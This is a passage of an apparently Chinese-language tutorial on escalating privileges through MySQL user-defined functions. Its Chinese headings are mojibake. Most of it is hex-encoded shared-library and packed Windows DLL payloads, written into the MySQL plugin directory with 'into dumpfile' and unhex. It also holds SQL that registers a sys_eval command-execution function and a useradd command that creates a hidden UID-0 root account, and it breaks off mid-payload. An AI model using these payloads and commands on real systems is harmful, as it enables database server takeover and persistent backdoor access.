00420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000') into dumpfile '/usr/lib/mysql/plugin/cc.so'; åˆ›å»ºå‡½æ•° 1create function sys_eval returns string soname &quot;cc.so&quot;; æ‰§è¡Œå‘½ä»¤ 1select sys_eval('whoami'); åˆ›å»ºrootæƒé™è´¦æˆ· 1select sys_eval(&quot;useradd -u 0 -o -g root -G root -p `openssl passwd -1 -salt '123' cimer123` cimer&quot;); Windowsç¯å¢ƒ è·å–æ’ä»¶åº“è·¯å¾„ 1show variables like &quot;%plugin%&quot;; å†™å…¥è‡ªå®šä¹‰å‡½æ•° 1select unhex('0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf8057156e5b593a7dc8058f05e2da4ca217cf5be8881e00fa9d1f7a618820a0f0b2ba6175dbca0b6f035bc24ebe83198b5a90ebde91e8954581da67159639f40f37210a1bd8bf14dc987fd37b1a5fe69bda234e6d7f70d9ca0531039f19fd054904eea5b7a52ec468e5345437d0737b1495dc7249ea4cfa6f48c2e3e6158d5f0f1efd1bafb4d7fe0b0dce7ad98e8d3f57bb708a8aea83a0eea3ddc00394dfcdfafd308b6b24fa20c7625d2fcd6a5fae7d273ec98eea794bfe979dc3123ffc32c197bdca6321b57785908e6d19ab6f536a8df7e1e05baded7a4ebc007766c508a13394f51803beea47fac0ed97c25ed9888ddc6dc6219e704c6a132cd04cff7447b2df742108d0272366b11b2c4767464b460251de4ce3ce6d193589d14aec9b97766a6883e4dbf1dca0edf32f8980ebf2f9c935dcc56fa6e0b29798ea458e6edc0af271e6814fa425548e41fc8f641b8ad487a20812e4eb25063746b3d4244b101031580a0119d649ca5f32a68b11e7d5741a5ad7682fa8fafbe5aff113269b9a47923f81d3a028615f8c6e7b38e78e443cb2a49d91c2a7757a99df35aaa71dfd21e0b5591af970e6d2f239ff7e2d76acd9967ad6fc30d460d552f1930461e9b86a92d358618fa3b539029603a3260fc65d57a5909e35777a633d9093911fc636bfe3745a7510cb4633092223f5315f6745a604ac0365abae8968b19677f840b1502e21b638ceffd5075b3d3688eab91379dfeed65beaa5f7ca5b971dbc53c6c000b259dea5d6fd84b2e12090331a45299d807d3c12545f84710d36168ca4f277c8fa3982806faef71d73860b58f8db7a3116af13418100c8e905651b538b5c1853fb194c574a918b8f0426152253ff3db5af8289080fe0d7bf2b9d907c54eb2604d8f4e3865d8c7e8659acd1928182206c0efad42664b6ef473f74d7a8d681273590a487f250c143bd18253c3df904b620f4203757b029d8b41bfbcb9ace3d5e7673386dab5e3e486a3f49bbf89f5a4c67e0c1067c0adf6bbdfa43cd6289c1e45e46fc4f236a708684f9461787a90f6fd9a1f55690bbb3ddfcb94d960c39f58110acd1a4538b6ae85b06e4024610575bc3069a2b90b07e01096854e1e8bd00260bd495f975c8543030031c6fbcd201bf384f27f72af8c9ce354ef66a27fbc04dc0bb34f7a67518575d78bcac95243f1743b0f843f7806d1b6278766e05e90694a328230b378516ece63e46180a0c2d3972674fa8de29c864198e66173bea93f54995bfaa4b1e8638ba111187e26161d23ddbaff9a1dde6c8601b6c1c5e0658a153685de38e7a92a39d34587d67d10da2d7a01e70ac5488b16d0002229154101f0d5f6afd6636f7e376a3d5842861f8c5642b81676a5a3dc14de9bfe1e3011cb9e4cdd6a1afa87e84f86ee792a090f48f9540a23eb0928cf8d9f52a44acba76c827494bb6ef8971f1690d441f0ba8322b5cb15ee105e95ab47f560ecef4d5046c75ded3523549b3a2a0c878906af9ef17bddb57d82a437932d9b6802cf178e34f9c4764054f01902258e7d2317b9a98e78bc273e406d6fd2d33c4270cfd4596fedec01c4f9e6216f73a71e930b208d247dceee69f0d1f55a179c70b69f71c0e8a8b4cfdd89cdb1908d6d96b33d98a26456f79f26c744f9f7508983324cc354c1f20f89480c8c506fa04f59cb8ae99f8bf4ae9ba8b06f6aa052b695aa5da8143eefda5b3a4d65b0333f944861d2d53503236151731f4b262d66597865ffebc3474f3566b56f4ba520e9fd933c304ef9ca43bd6336e9b82e0e76724c1820aa1bc231ae694cf759938c29c210cb676885a65b4ae212f4382788458ea9a136bfc9bfed6f159e0844c4db54a3bac68d95cc91623f7e1476f8f736c131097daf671157f18d67116a2d273fa9e53375955bb7bb6ecb3518e7f05dd9248a1e26607708ab2a67904c44325fbe219e04512da82e93d466fa33a7d00d70d1cd45d650f3bf001bd7a2d0ae1c545fb75fb6af69bbde85e358e272b26dd2ea189db0a41c1131ec3882d5b72e3a643e02527909758ba4bd542746b60d822b35884b828a12b683aa4abd4861f7a249bbc0dbc12559e88c2bce5bf5aa35c0b17c69794abbc5765e7eabca36ebfb7318998f974d42f3df2564e29abe38e7671d25702051346b86fa36f6b71dae27e7506e5a5a790658646ab672bb825857890107e837992ab33ad751963c155d5d85dbca61092accb9e38c4589db3487082068f2dfc818fe05f8ce8a18dfc6716e0466e87d79ad6bf1353b0a34be96416d0f44c44a9563fdbc2c093875a385ecfdc6e11a488964690333669e8dc714957e0e1b3ce29c2309bd17ccc74520cda658381385821f44137a3486a682fcefc2e111d8304264538a64e8acb6e791960342463f970c4d250e154f28b66a5a7011bf7942c04e053804c100e79a1cbc4278f689ab9a3bd4669928bcad4c165644b53695fc7910a2129a872e548de830ef3b7ee255e7b6480f06f9fd895e84e5b5e038ffc0389317e95a79dbe8c95c8b8bcaef5a524abd85da966e905d2db3946d56eee8f5006ce54eea02c035af841bdcf95509422fc24329e6a03bf6eafbefe5b6ffe19f45a63ceb73ef8bcb0ea9e3030d27c3d6a8ddd88b041dc47fb229431498262a8887785dd8657c055229dad916a71360aa931bd7e158b6c17e3a2d8cefd88f77e40ebbcfa4db96b89d6f51402d7e325a8e64fe1fab085568dc5f373bce2bd05b24eb60f87214fa162086d5521d39ee0eb565f86f338ff996e3fcf4a9dc36f3a32cdcc356eff69cc0f5bacea0f331494796d808168b83eeb8489c0f687052c709e7558005e7d34aa60424265cc8a656d065ca83b78ed51d0a2a6f1768c3048ade80275469ca6091a5720d56e36c1c5dc0f6fa344259d34c2324821ede5ce0ddf1b9d9132270a6c2ace863d258b5377f3dabd660a0c4d59278fa23f056d76b077812e7db036500bdd1bb333043ff1aa5267ed828ee5af9e4cdbdeea851f3234f93700e681f13b5eacb938e03851d4e80f319d5dc8e6439fa41475d6f133d131cebefe4db7f3a7c0b9d62511805373e2a5ccb637b81fd27fddf03eb72d74bf20b54e00a501acf1a61aba9d994055402d838b85930912630335e5b545c0058d9474e5ac355a5f630f8ae6e3860bf8a62798926179a3bc9c2e7264752ea7a0b45bb6053169504510e70a043d3efdc5af76a2e1df04c2a2b7cf96dff5e8f212510d9dfec01b425107c9c8fa7500637a27eff7bb7eb7935566bfaf5d37323def1740318875ba2e0cea9dd3ae9ab7d0bf74ad9fb7c87c91a62aafd80b8661f28d5148d92a4f8f80167b786751a40edca8b3de8c2bb05c7cd682865ac3493377cba23a4e1fea18299336e7533e38af3598acde9646c1d6164b3fa8059aaa522824f6ffb90c12b4827d0e0302153f2126201bb6b588875cab0d346a7dc8749654f503f01bd9a4e672a88104829417bfd2e344b435fd111ce7ff27b56c81b44c487df01e63f0ba70228ad76fa2b4e0d5a57d7f63827afc2328a3f6b679eb581c9247689baf8057fc892bf5b323f19091b085bfd1625d7458d8a8a8ba3248fe992fe9edb14dafe34355234271d9ceaf4e9e298c02743be6b5488a8e248baae788e793301078ebc3824424374a0624404d6ce2d268fcf0052a20125e71295eea2b0c395ecb2f4bc20efd7270e4b00f2a17de04a587c4e17bdbb07713f830be090c4200db5477f75e44c9714d4eee288e438fd3c6887e5b08ba6f2f015dc749871fed99ac7bb5d25de80ff396f0139c1a98ecf25971383068cd71083d9a3d11f73860372efeb266da459d9e3f49d7c6a47e034ba7d97142cc6183bdcd38b0881ae18061070e767f68835d8e51dd585dbb6597b8e66ea60a553d876bd355b83d2c1340385ecfacda26d65c744aa6d025dd393ec353778c0c24df4abce8f96006856ce322cc902aed08ad19ec4c01ea392ddd15ea0b6f25fab35cc314169c440e9552e5dcfbf02a7eb924c8f40e7299245d550ced955f57dda2b95770de0f80041384f26f075cf4eeb0b893f5a3844e9779b5ed0c83810f6ff31836f6c289a7bdfc95e9d452f931e6dad9252d97220485e59aea90fa8df84b17e993f1627ac66a7ce4920eb63fd7f27b0969e7e19fb83f8252623818cd78ca73414cbb5be0f242ed5fbe337fafb88cc3d203b5cbc73daef664635f7c9db24a6a7795ab7f2fec1d47cda394ca4367013911174e0a7949c6a8993483c76891b248803a5be67deed96cf301a14ab61246be742eb8e3a09d3c619ad9f3320ff53b99c2b6b2f41b009d629ce0df2494836158fbe4bf7e3460d88cb212c99a4decf3f9ccec071f494269d7bd570b5ea0fca07485e5326a4a6727e7e0c101375e4239535ee6b0d63a20c3c9bfc5d0dd9940348c3421673039371ae3074698e7167c70fc635ecb2daa207aaf4570043f2dadb1af007b930d979cc0da729baff0e077df062ad3f2bcbd4e9daebd96f90fe9946cd88eee0d72a9ed035af0bfceb843a2399468088a24d8b999403438fc99f0da8e4a91a939953ffaf7251ca3fd466ff2110afb33242e278c6b072f5ed3df4c1482d28722874f0b1f30226bf336699766333dc331abf7ec09466be15eceaa2bc8d6b21ba56d5e960b7b485466ac92f03b3ae98bdc441686e2d89975756dd922bde9f8760c6a9a21e046d9f38ad2477e5c11e306b7f335eb5bdc198c28a28139b4944f43cd22b6798e89ed772271a43f1c802db013d047977dfd98361a4ee89186dbfe61fbfa02432ac4645f0ded7e6ec07e82f102922c1917082529e3a364b43196e93c1ec6353a0f972165d63b2086e43d31c21e28136e72f338ffeea68bca8490d58227d435dcd2defed8ca49cf486ab29b7e776220e66c20636f1f551d54bae83b4996ec68d656f1a29b82d806f5498f29178f503919d517835f289d4b5f679d61c4f91522ed8ab502b544346ed3b3c2fc949a149a24a703aa524a38a233323a02fe5fd220884d708999f227cc27f800b6b00c4cae107def5b0cb9ca4336875662af9622231b38521463432c4b7ef837569efbad1fb7d6ca953e28d1d0e520b0c98fd74a424a6c06d41a60d7cd6e8ee721847acf03f996c371c321a83bf15d37c72aaa44b51bf5a7e8caf1c3787eee48aaf372f010931cff21682968b2033bf4809203203ec61566f96fcd2acd00172d91e9bfb5b8025652263281d985b316040ddef4aeac0f8e3542b41b76ff98b5d0303854aaa254c3a841867bb25c65fcbc2271814b525be74b3401b240fe5fa3ab12175af55366c7a839fa2c7ff59f85bf0b51943df5c12537ca78ae77c176c5e4002a87893a62c256f0c4f86778e4e059c0aa20e75bfc5c2835f4df0fcd7ac1171f49a8ce39ec5b6a2f69b995997dc62f7638c6e379846045e4a6ee0c1dfd162e2655b45769fa10e87bfd6b4a488477dd4f8e70cdbdbeeff66daa8715f286ac7a73506871cc21e4f7ef300b6c295c78c1b3e5d6031d7fb3be5b5635bdb92bf94c3f4e4335724182facaa37c5d65ff165913ff61cd8971d178a62444e45d6c92b19bc9a1b21febe3715a1f9f916aaab25910986da22c736954bfbf8b0c0281b1ef97b9851b12ff39d1ad97dbecde06fb708a588f4bc99dc5d52f1ab87407b40c1e06d23761e354a2dfde9324f64b7d3391c5d2857904a12965011bd2d1f5d6e5fadc4d4acd5605167f10172dfbdf466ef9f34fd1b5b290d426bb3c4c812de12616016c6dfed62615f522342a1157218cc54ecb2874a3fff11d97810c5d667413cf74008b6ba55cf547d7ad1e10930da17f15a7b9979dcdec0191f00fecc45a8321f0ec2c4c2abc963f8bdf34f3d05b8db7591880c0e36ea294ca4e483be57094addbf9edae51f8b0c97bf47861304e7b304f3591f1f2e6f2b287b3ce9e64fefad5e811725b9a41ea799735ac307790582e651e16020bcb3c4a4c34735b4c6527703674d5506d63e7a5a5511018dd34532ca896906e1b8c9dcfab3ae32e52727f9322ca39609cfbcf058e20920c673e7af34cc8f3450b3a52e16deb895cdb2e412d26b88b9c2837bcb7f82c9992cdbe9dea677a34e4d9c612cb2dcdbcc9a2eb11d77558410c483844a7a9cca54e1a2a2d74d131817dbbefa63405bbbe04c659868fe80cf240daf9c26eebdb898077e59114a226bcd0d8a24e2ededb73f18128661f5ed021b14ccd6c706ad72dd68614248496fda0e7428ac21269c6cdfd567800cf258f031de85d46a1dd9f962acc481085a1078e95f9a839d5c08e55c2652879d2c2506429689612ed4a6431b1e2302965b00f9ae4c6520f18711ee8e618d4dca0d4927b88381cc0d5fe9652f29a3e45faf1918a1663b0a117fc3ba17640c01d60b305d4aa89afc9a50517e78bd488b66c4bda8ed57e3ba56270478bebb4737580f1f77785cb60bfcdfe840e9053d3b5f06750adcfbfe713cb46a1df4b7a828a4f3c8117e208a7b3d8d934b408478101d29dba20493b57a443962e2969f3165a200fe6ded2692a029cb1f9c138e25c14903129b018eba648d93c2079a614dd03d948fdea6e877b748fff6a7d396bc58e096ca72a525cb67594841f95a99ea9351ccda548a7b7b2311ec672b27e535edac3c2bbeeec863b4ed848b53488189ab6bfea6bd376e5280f0f4f5a1d526fbcc91a97a3d21f044235d6bed56284c19c41f4cfa3f31598e7dcb31fa761e61a9bf57f19daa3ba5634e5a37cb7bddc6115d436f9b3a0e56fc0adbbc4b34e8c0e25643d7b9bdb32267f524b2965a37e5070db5fb5b612d249ec12960128f7980d700b2253a5fab0fea4aa9735144d640d7f25a34282a3517f2dfe39d595c4c68a525e1ed92ebbdc50798b5b62fa8a694e61af9db663f2f0f6bec86ec451fa0b08584c23feab9804dcaf95899fe80206103a841f88ffd663d3d475eb4633ff36702afad9eb4c8b666014d89c21eff0f1036b6fe2845d5e24870e45d61f89eb8ed87a70289500391151d89ed889cda7fff8575a19e9b824aa2b28a9ff22a7b603bc6c91bfdd38b01303c2fbcd51d62a5fd73db8305ff84d7436901d0c3b613b6bae8216d15e357181b6cccb325dcb1ec9e41f5282165e6333011ae090f9fe001a3a2d8f3e47c1fcbb651c0040ae1fd3a593934b8e838ad397ba115433dff9f55e62dae5d5f768cd6a5becb121aaa08cd3f1e83f4ac69eb191247573ecc66c6c9faa7dc5f97e3405dbf86a9211c9450c62218c5f14f3719b0a1ebb7e9128e8989070e8921eb4e0552339b34d02b2b80d12a966ab63562ec61688d46b3beacf361793d9f2df65024473dd785b8ad4a5b98fcd1385cd2cb78e01061d0e8e23b437022f42a2f8ea396b44c1abf35b644efacbb064345eaba265093eb75d6ff9371edce1d3eb1ecbb364c55db41e0287554af06ca4b0db4875a5d2c8f1aba69771790d792b06ac064a9d12854e2324a485ccf5a4fe6ad39c3a57ff30c8a83b341bbc69e9dbbb89530b2009a30b5bff3adf3505311dd291208d47edd288bcf6bbff26a2877254b4dceed90a3f7a4a5b2f7594f02e43e07b635a4ee8b182c4fef7282352a655bcb4e8d7fa68365712b23ad0bd600dc3d5f39af26290a4dd8564b68d1c985cef5434c461d8206bac6d7c0d1e55eab379c5a8b1c17eeeace75590c78bc63a59e3a72827c0584500ca48ccfc2a65e16b3527950ade1f945f1dc31044f0b56ffd1d372014a9b347d85d63d0efe03d1bd6ae0fc95d5703dddfa091098ea4b8228ec77fb6fa192c969343232c3ea5896d9a39503c528564d8babfebde7c85c9ba14aeae5c012c41a75450ee464298d6af1cdb03e44211d2c6796babec9d335446977aa552a51dfdf7d61cc8ba4ada1d5674321ba172aabcb7e82caa3e497923de2a466ca1e908b118b4dd07fa6fb40901f3d6e0d6af3dcbeb2b678e44899b8663f1e91cd00a32f21c407965aa89cc3d6a43b5d9a4472c756e6620a82f22fdeee5e4d416698f75dafb1f4e19b4114b65e4ef6de33348cc5292a67e598eb84edd47841ea6145ae1a9feda9d2a41983af77596a87083ab0c88e27bde0ba0cb96b5ec0641b2c7b82455e3b72013fe5112e3ca8657e5a785fe8bf5fc2d2073bd75910a12215949867c1fd5a9639f6aa9640bbbc7e59194bd165dea0402f949e8baad329f46fa16cef4390faf9b7111e2575fe16e1b76639ca0079afbdd03741aa148754ad5d7dde6b4321ee295003a0b23001a2cdf27f263a71876958295fe9b3721c1f04ea2eebbe98bddd7f0af338a88b9bd57dc88710d28f573e2a2d905d713af99d492c129b2d539277d7418b1d357a74adbe27585c25bd2c16c9f39f66ced1f5472f2da1b92c195b5aa84737c1c51a7a1bde1344bae614912654ef6643e3d820b121dd2631cb6d497aa826c4eb79dc98c6b8a9bac431659610a6c7d1511a6fda5b7769c847b59052f072b2af69d47efca50f39afad47158ba81fe287d725d07003bb58f0ecdf7467992f63b6e413b932d70aae0930e0f1ff762f3d004526d89a388c690a20b949f574d6c248d6ab42696437dcfbc9fefeeb40742dd3c10d2f5f22c05e8e7c0fabbfa12aaf186a79b47f3c7e0cbcc2d0152ff2aea736096537a3c9c1f936ba96bb64733907701efd65a619c788b589a7f15702bcf2f0af62857b9f8a7e343156ed3e483fd08f34957354daeed6827c67b34f6b3461dfdb2bd3c8d390fb31930c3822fb7f694a22f3239d012f706dabff10b03f0e66869be4a435eff24469dac80754839d8933e1e781b965826eb53c47fc53bc2a85386cce1dd07fed6dc16390562ba8362bdc541919893cc2ccbf5565ba3b37166a31221de542d5b11ef0381d32e8ed8a4c8789a219721f821b38e2106cda68c2c6d2088fa5b3d1b9c2f8c543ef40555d9f667186fefef64b54dbae5a906dad48cd02e0fdb4500aa492e7efc6d5698dce363563bbd606179dc7821b9a736c31f39def29f10e40dafdc52d29b591178223b5e84f1983dd54a62981d8eab5b674d80c70627135ad90c1bcbdc2a9bdc926653cd56078eda264b9c9226fc4c9b549fc4cf73cdd41a7c26616755e7f8a1450f5236d1ba0c378188ae71d5344eadf7d04dfc122af44d59e9c263a258739c34082d88c0760ed5067baabd00485a3339e19afa4ffca023ac57c936fa78b1c7c04dc0d94f2542dfabb0f3ac3a7536d7d1384edf06729ff08eba1b7a7f5dd3f78f154f51f6092db8dbb91f8d0ea81065f4d0c431276a68f416022be7efa82d735613025c3f593c7d57b15643be8ad7126102ace4ec9a82b32b3ca4ca9140aec4d9f0172c7e7dcb22fd06e0b9d3bb1ae41b5c8a7d35e043e75f30eef7c0abd7d10bbe23847dab51b9031fc61f1f8a05cf395970d66d2193de952644efd0da226dc1858df23950e1d871d93ce5d1008e5dba83545a24ca5fc3012e126fa3950b6ece8849d4ab945583614e3b2afebd234049766b6e735956e93fddc17911129ae13bed1594c03d0f5d92929c3cb685172bafee4c9d0ef45ea41e453ed07df0aee980fb563d6ddde1ffd0774120946db1246da6ce55c76d31f93c495e100ed6a5afd7d193112bf1c068430e038320be0499ec8c524580700909ab767df81d86debdce5c01748f010ef0e9862027eb951a5018c4da0382b6c3dc8f76fac6fdecd4a0cb9a2b34d48ba009947706d3c720fd882b7cc73405a308a6784d14389d8d781b819ff556f012e88bc1638c35c62a060f6c30fd399e963ee82b2588b4dcc001307e69cfd9f6fdf6e611b0b69f22e3d02ab78a09691312b6eff74499cbbb852e412ecb166ffbf7c6d3be3413a19a584c830cea1cd5e9a1f52eb37ca558292e827787745ae7c7041f981cf94a513584b3486e2632c9dbca0c5908502f8cfb53d002e36b3cf3df31ec7da8e79169ec2f39918142af1788eca5cd67e60e13dfaf37ecc0d9cc5fd33215f54253f